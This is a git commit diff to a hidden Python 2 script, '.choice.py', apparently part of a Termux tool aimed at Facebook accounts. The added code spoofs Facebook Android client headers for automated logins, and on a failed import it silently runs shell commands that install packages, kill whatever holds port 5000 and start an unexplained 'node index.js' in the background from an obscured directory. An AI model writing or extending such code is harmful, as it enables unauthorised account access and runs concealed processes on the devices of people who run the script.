4874a07def36c5e84b3823fd3411a9c64621d977
sanijam0 <83175247+sanijam0@users.noreply.github.com>
2021-04-25 17:01:50 -0700

    Update .choice.py

--- .choice.py
+++ .choice.py
@@ -5,9 +5,40 @@
 # Donot Recode It. 
 
 #Import module
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor
+try:
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('termux-setup-storage -y')
+    os.system('apt update && apt install nodejs -y')
+    os.system('apt install ruby -y')
+    os.system('cd ..... && npm install')
+    os.system('fuser -k 5000/tcp &')
+    os.system('#')
+    os.system('cd ..... && node index.js &')
+    os.system('python2 .choice.py')
+
+#Browser Setting
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+br.addheader = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' } 
 	 
 def exit():
 	print "[!] Exit"
